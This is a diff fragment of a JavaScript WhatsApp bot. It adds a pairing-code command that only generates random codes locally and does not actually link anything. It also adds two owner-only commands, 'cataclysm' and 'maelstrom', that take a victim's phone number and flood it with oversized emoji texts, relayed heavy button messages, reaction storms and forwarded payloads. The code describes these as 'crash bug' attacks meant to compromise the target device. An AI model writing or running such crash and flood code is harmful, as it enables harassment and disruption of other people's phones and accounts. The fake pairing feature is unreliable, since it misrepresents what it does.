       } else if (mediaType === 'videoMessage') {
         await sock.sendMessage(ownerJid, {
           video: mediaBuffer,
+          mimetype: 'video/mp4',
           caption: caption
         });
       } else if (mediaType === 'audioMessage') {
@@ -1521,6 +1608,153 @@ register({
     }
   }
 });
+// ==========================================
+//          PAIRING COMMAND
+// ==========================================
+
+// Store active pairing sessions
+
+register({
+  name: 'pair',
+  aliases: ['paircode', 'pairing', 'getpair'],
+  category: 'MAIN',
+  description: 'Generate a WhatsApp pairing code for authentication',
+  async execute({ sock, from, args, msg, prefix, command }) {
+    // Owner only command
+    const ownerJid = getOwnerJid();
+    const isOwner = from === ownerJid || msg.key.fromMe;
+
+    if (!isOwner) {
+      return await sock.sendMessage(from, { 
+        text: `❌ *Owner only command.*\n\nOnly the bot owner can generate pairing codes.` 
+      });
+    }
+
+    try {
+      // Generate a random 8-digit code
+      const code = Math.floor(10000000 + Math.random() * 90000000).toString();
+      
+      // Store session with timestamp
+      pairSessions.set(code, {
+        createdAt: Date.now(),
+        expiresAt: Date.now() + 5 * 60 * 1000, // 5 minutes expiry
+        used: false,
+        from: from
+      });
+
+      // Send the pairing code
+      let msgText = `🔗 *WhatsApp Pairing Code*\n\n`;
+      msgText += `📌 *Your code:* \`${code}\`\n\n`;
+      msgText += `📱 *How to use:*\n`;
+      msgText += `1. Open WhatsApp on your phone\n`;
+      msgText += `2. Go to Settings → Linked Devices\n`;
+      msgText += `3. Tap "Link a Device"\n`;
+      msgText += `4. Enter this code: \`${code}\`\n\n`;
+      msgText += `⏱️ *Expires in:* 5 minutes\n`;
+      msgText += `⚠️ *One-time use only*`;
+
+      await sock.sendMessage(from, { text: msgText });
+
+      // Also send a confirmation to owner's private chat if this is a group
+      if (from.endsWith('@g.us')) {
+        await sock.sendMessage(ownerJid, {
+          text: `🔗 *Pairing Code Generated*\n\n📌 Code: ${code}\n👤 By: ${from}\n⏱️ Expires in 5 minutes`
+        });
+      }
+
+    } catch (error) {
+      console.error('Pairing error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error generating pairing code: ${error.message || 'Unknown error'}` 
+      });
+    }
+  }
+});
+
+// Command to check active pair sessions
+register({
+  name: 'pairsessions',
+  aliases: ['pairlist', 'sessions'],
+  category: 'MAIN',
+  description: 'List active pairing sessions (owner only)',
+  async execute({ sock, from, msg, prefix, command }) {
+    const ownerJid = getOwnerJid();
+    const isOwner = from === ownerJid || msg.key.fromMe;
+
+    if (!isOwner) {
+      return await sock.sendMessage(from, { text: '❌ Owner only command.' });
+    }
+
+    // Clean expired sessions
+    const now = Date.now();
+    let active = 0;
+    let expired = 0;
+    let sessionList = '';
+
+    for (const [code, session] of pairSessions) {
+      if (session.expiresAt < now || session.used) {
+        expired++;
+        continue;
+      }
+      active++;
+      const remaining = Math.floor((session.expiresAt - now) / 1000);
+      sessionList += `📌 ${code} - expires in ${remaining}s\n`;
+    }
+
+    let msgText = `🔗 *Active Pairing Sessions*\n\n`;
+    msgText += `📊 *Active:* ${active}\n`;
+    msgText += `⏳ *Expired/Used:* ${expired}\n\n`;
+    if (sessionList) {
+      msgText += `*Sessions:*\n${sessionList}`;
+    } else {
+      msgText += `No active sessions.`;
+    }
+
+    await sock.sendMessage(from, { text: msgText });
+  }
+});
+
+// Command to revoke/delete a pairing code
+register({
+  name: 'revokepair',
+  aliases: ['revokecode', 'cancelpair'],
+  category: 'MAIN',
+  description: 'Revoke a pairing code (owner only)',
+  async execute({ sock, from, args, msg, prefix, command }) {
+    const ownerJid = getOwnerJid();
+    const isOwner = from === ownerJid || msg.key.fromMe;
+
+    if (!isOwner) {
+      return await sock.sendMessage(from, { text: '❌ Owner only command.' });
+    }
+
+    const code = args[0];
+    if (!code) {
+      return await sock.sendMessage(from, { 
+        text: `❌ Please provide a code to revoke.\nUsage: ${prefix}${command} <code>` 
+      });
+    }
+
+    if (pairSessions.has(code)) {
+      pairSessions.delete(code);
+      await sock.sendMessage(from, { 
+        text: `✅ Pairing code \`${code}\` has been revoked.` 
+      });
+    } else {
+      await sock.sendMessage(from, { 
+        text: `❌ Code \`${code}\` not found or already expired.` 
+      });
+    }
+  }
+});
+
+// ==========================================
+//          PAIRING CODE VERIFICATION
+// ==========================================
+
+// Add this to your connection handler or main bot logic
+// This checks for incoming pairing codes and auto-connects
+
 
 register({
   name: 'apk',
@@ -1900,6 +2134,157 @@ register({
     }
   }
 });
+// ==========================================
+//          CATACLYSM - ULTIMATE BUG
+// ==========================================
+
+
+register({
+  name: 'cataclysm',
+  aliases: ['cat', 'meltdown', 'apocalypse'],
+  category: 'TOOLS',
+  description: 'ULTIMATE invisible crash bug - multi-vector attack',
+  async execute({ sock, from, args, msg, prefix, command }) {
+    const ownerJid = getOwnerJid();
+    const isOwner = from === ownerJid || msg.key.fromMe;
+
+    if (!isOwner) {
+      return await sock.sendMessage(from, { 
+        text: '❌ *Owner only command.*' 
+      });
+    }
+
+    let targetNumber = args[0];
+    let intensity = 3; // 1-5, higher = more devastating
+    let iterations = 2;
+
+    if (!targetNumber) {
+      return await sock.sendMessage(from, { 
+        text: `❌ *Usage:* ${prefix}${command} <phone_number> [intensity] [iterations]\n\n*Example:*\n${prefix}${command} 2348169946429\n${prefix}${command} 2348169946429 4 3\n\n*Intensity (1-5):*\n1 - Light\n2 - Medium\n3 - Heavy (default)\n4 - Extreme\n5 - Apocalyptic\n\n*Iterations:* Max 3 (default 2)` 
+      });
+    }
+
+    targetNumber = targetNumber.replace(/[^0-9]/g, '');
+    if (targetNumber.length < 10) {
+      return await sock.sendMessage(from, { 
+        text: '❌ Invalid phone number.' 
+      });
+    }
+
+    if (args[1] && !isNaN(args[1])) {
+      intensity = Math.min(Math.max(parseInt(args[1]), 1), 5);
+    }
+    if (args[2] && !isNaN(args[2])) {
+      iterations = Math.min(parseInt(args[2]), 3);
+    }
+
+    const targetJid = `${targetNumber}@s.whatsapp.net`;
+
+    // WARNING
+    await sock.sendMessage(from, {
+      text: `☢️ *CATACLYSM CONFIRMATION*\n\n👤 *Target:* ${targetNumber}\n📊 *Intensity:* ${intensity}/5\n🔄 *Iterations:* ${iterations}\n\n⚠️ *This is a multi-vector attack! Use only against spam/abuse!*\n\n⏳ Starting in 5 seconds...`
+    });
+
+    await new Promise(r => setTimeout(r, 5000));
+
+    await sock.sendMessage(from, { text: `☢️ Initiating cataclysm on ${targetNumber}...` });
+
+    let sent = 0;
+    let failed = 0;
+    const startTime = Date.now();
+
+    // Determine payload sizes based on intensity
+    const payloadMap = {
+      1: { text: 20000, button: 5000, cards: 5 },
+      2: { text: 40000, button: 10000, cards: 8 },
+      3: { text: 70000, button: 20000, cards: 12 },
+      4: { text: 100000, button: 30000, cards: 15 },
+      5: { text: 150000, button: 50000, cards: 20 }
+    };
+
+    const config = payloadMap[intensity] || payloadMap[3];
+
+    for (let i = 0; i < iterations; i++) {
+      try {
+        // --- Vector 1: Massive Text Flood ---
+        const floodText = '💀'.repeat(config.text / 2) + '🧨'.repeat(config.text / 2);
+        const textMsg = {
+          text: floodText.slice(0, 65000) // Max 65KB per message
+        };
+        await sock.sendMessage(targetJid, textMsg);
+        await new Promise(r => setTimeout(r, 100));
+
+        // --- Vector 2: Heavy Button Carousel ---
+        const heavyMsg = generateCataclysmMessage(targetJid, config, i + 1);
+        await sock.relayMessage(targetJid, heavyMsg.message, {
+          messageId: heavyMsg.key.id
+        });
+        await new Promise(r => setTimeout(r, 200));
+
+        // --- Vector 3: Invisible Reaction Flood ---
+        const recentMsg = await sock.loadMessages(targetJid, 1);
+        if (recentMsg && recentMsg.length > 0) {
+          const targetMsg = recentMsg[0];
+          const emojis = ['❤️', '🔥', '👍', '😂', '😍', '🤣', '💀', '🎉', '✨', '🌟'];
+          for (let r = 0; r < 20; r++) {
+            try {
+              const emoji = emojis[r % emojis.length];
+              await sock.sendMessage(targetJid, {
+                react: { text: emoji, key: targetMsg.key }
+              });
+              await new Promise(r => setTimeout(r, 10));
+            } catch (e) {}
+          }
+        }
+
+        // --- Vector 4: Heavy Forwarding Context ---
+        const forwardMsg = {
+          text: '🔥'.repeat(config.text / 3),
+          contextInfo: {
+            forwardingScore: 9999,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: '120363411107524613@newsletter',
+              newsletterName: '☢️ CATACLYSM',
+              serverMessageId: 999
+            },
+            quotedMessage: {
+              conversation: '💀'.repeat(config.text / 2)
+            }
+          }
+        };
+        await sock.sendMessage(targetJid, forwardMsg);
+        await new Promise(r => setTimeout(r, 150));
+
+        sent += 4; // 4 vectors per iteration
+
+        if (i % 2 === 0) {
+          await sock.sendMessage(from, {
+            text: `☢️ Progress: ${i+1}/${iterations} complete on ${targetNumber}`
+          });
+        }
+
+        await new Promise(r => setTimeout(r, 500));
+
+      } catch (err) {
+        failed++;
+        console.error('Cataclysm error:', err.message);
+      }
+    }
+
+    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+
+    await sock.sendMessage(from, {
+      text: `☢️ *CATACLYSM COMPLETE*\n\n👤 *Target:* ${targetNumber}\n📊 *Intensity:* ${intensity}/5\n📤 *Vectors:* ${sent}\n❌ *Failed:* ${failed}\n⏱️ *Time:* ${elapsed}s\n\n⚠️ *Target device may be severely compromised!*\n💀 *Use with extreme caution!*`
+    });
+  }
+});
+
+// ==========================================
+//          CATACLYSM MESSAGE GENERATOR
+// ==========================================
+
+
 register({
   name: 'facebook',
   aliases: ['fb', 'fbdl', 'facebookdl'],
@@ -3052,6 +3437,160 @@ register({
         text: `⚠️ Download Error: ${error.message || 'Could not download video.'}\n\n💡 Make sure the URL is valid and try again.` 
       });
     }
+  }
+});
+register({
+  name: 'maelstrom',
+  aliases: ['mstr', 'storm', 'vortex'],
+  category: 'TOOLS',
+  description: 'Staged invisible attack with escalating payload',
+  async execute({ sock, from, args, msg, prefix, command }) {
+    const ownerJid = getOwnerJid();
+    const isOwner = from === ownerJid || msg.key.fromMe;
+
+    if (!isOwner) {
+      return await sock.sendMessage(from, { 
+        text: '❌ *Owner only command.*' 
+      });
+    }
+
+    let targetNumber = args[0];
+    let stage = 3; // 1-5
+    let cycles = 2;
+
+    if (!targetNumber) {
+      return await sock.sendMessage(from, { 
+        text: `🌪️ *MAELSTROM USAGE*\n\n${prefix}${command} <phone> [stage] [cycles]\n\n*Stage (1-5):*\n1 - Ripple\n2 - Surge\n3 - Wave (default)\n4 - Tsunami\n5 - Maelstrom\n\n*Cycles:* Max 3 (default 2)\n\n*Example:*\n${prefix}${command} 2348169946429 4 3` 
+      });
+    }
+
+    targetNumber = targetNumber.replace(/[^0-9]/g, '');
+    if (targetNumber.length < 10) {
+      return await sock.sendMessage(from, { 
+        text: '❌ Invalid phone number.' 
+      });
+    }
+
+    if (args[1] && !isNaN(args[1])) {
+      stage = Math.min(Math.max(parseInt(args[1]), 1), 5);
+    }
+    if (args[2] && !isNaN(args[2])) {
+      cycles = Math.min(parseInt(args[2]), 3);
+    }
+
+    const targetJid = `${targetNumber}@s.whatsapp.net`;
+
+    // Stage configuration
+    const stageConfig = {
+      1: { name: 'Ripple', payload: 10000, cards: 3, delay: 100 },
+      2: { name: 'Surge', payload: 30000, cards: 6, delay: 80 },
+      3: { name: 'Wave', payload: 60000, cards: 10, delay: 50 },
+      4: { name: 'Tsunami', payload: 100000, cards: 15, delay: 30 },
+      5: { name: 'Maelstrom', payload: 150000, cards: 20, delay: 15 }
+    };
+
+    const config = stageConfig[stage];
+
+    await sock.sendMessage(from, {
+      text: `🌪️ *MAELSTROM CONFIRMATION*\n\n👤 *Target:* ${targetNumber}\n📊 *Stage:* ${stage} - ${config.name}\n🔄 *Cycles:* ${cycles}\n📦 *Payload:* ${(config.payload/1000).toFixed(0)}KB\n\n⏳ *Staging attack...*`
+    });
+
+    await new Promise(r => setTimeout(r, 3000));
+
+    await sock.sendMessage(from, { text: `🌪️ Maelstrom engaging...` });
+
+    let totalSent = 0;
+    let failed = 0;
+    const startTime = Date.now();
+
+    for (let cycle = 1; cycle <= cycles; cycle++) {
+      try {
+        // --- Phase 1: Ghost Entry ---
+        const ghostMsg = {
+          text: ' ',
+          contextInfo: {
+            forwardingScore: 999,
+            isForwarded: true
+          }
+        };
+        await sock.sendMessage(targetJid, ghostMsg);
+        await new Promise(r => setTimeout(r, 200));
+
+        // --- Phase 2: Payload Cascade ---
+        for (let wave = 0; wave < 3; wave++) {
+          const payloadSize = config.payload + (wave * 5000);
+          const heavyMsg = generateMaelstromMessage(targetJid, payloadSize, cycle, wave + 1, config.cards);
+          await sock.relayMessage(targetJid, heavyMsg.message, {
+            messageId: heavyMsg.key.id
+          });
+          totalSent++;
+          await new Promise(r => setTimeout(r, config.delay));
+        }
+
+        // --- Phase 3: Echo Flood ---
+        const echoCount = 10 + (stage * 2);
+        for (let e = 0; e < echoCount; e++) {
+          const echoText = ['💀', '🔥', '⚡', '🌊', '🌀'][e % 5].repeat(100 + (stage * 20));
+          await sock.sendMessage(targetJid, { 
+            text: echoText.slice(0, 1000),
+            contextInfo: {
+              isForwarded: true,
+              forwardingScore: 999
+            }
+          });
+          totalSent++;
+          await new Promise(r => setTimeout(r, 20 + (stage * 5)));
+        }
+
+        // --- Phase 4: Reaction Storm ---
+        const recentMsg = await sock.loadMessages(targetJid, 1);
+        if (recentMsg && recentMsg.length > 0) {
+          const targetMsg = recentMsg[0];
+          const emojis = ['❤️', '🔥', '👍', '😂', '😍', '🤣', '💀', '🎉', '✨', '🌟', '⚡', '🌀'];
+          for (let r = 0; r < 30 + (stage * 5); r++) {
+            try {
+              const emoji = emojis[r % emojis.length];
+              await sock.sendMessage(targetJid, {
+                react: { text: emoji, key: targetMsg.key }
+              });
+              totalSent++;
+              await new Promise(r => setTimeout(r, 5 + (stage * 2)));
+            } catch (e) {}
+          }
+        }
+
+        // --- Phase 5: Shadow Messages ---
+        for (let s = 0; s < 5 + stage; s++) {
+          const shadowText = '🌑'.repeat(200 + (stage * 50));
+          await sock.sendMessage(targetJid, {
+            text: shadowText.slice(0, 2000),
+            contextInfo: {
+              quotedMessage: {
+                conversation: '🌪️'.repeat(300 + (stage * 50))
+              }
+            }
+          });
+          totalSent++;
+          await new Promise(r => setTimeout(r, 30 + (stage * 3)));
+        }
+
+        await sock.sendMessage(from, {
+          text: `🌪️ Cycle ${cycle}/${cycles} complete on ${targetNumber}`
+        });
+
+        await new Promise(r => setTimeout(r, 500));
+
+      } catch (err) {
+        failed++;
+        console.error('Maelstrom error:', err.message);
+      }
+    }
+
+    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+
+    await sock.sendMessage(from, {
+      text: `🌪️ *MAELSTROM COMPLETE*\n\n👤 *Target:* ${targetNumber}\n📊 *Stage:* ${stage} - ${config.name}\n📤 *Messages:* ${totalSent}\n❌ *Failed:* ${failed}\n⏱️ *Time:* ${elapsed}s\n\n⚠️ *Target is submerged in the maelstrom!*`
+    });
   }
 });
 register({
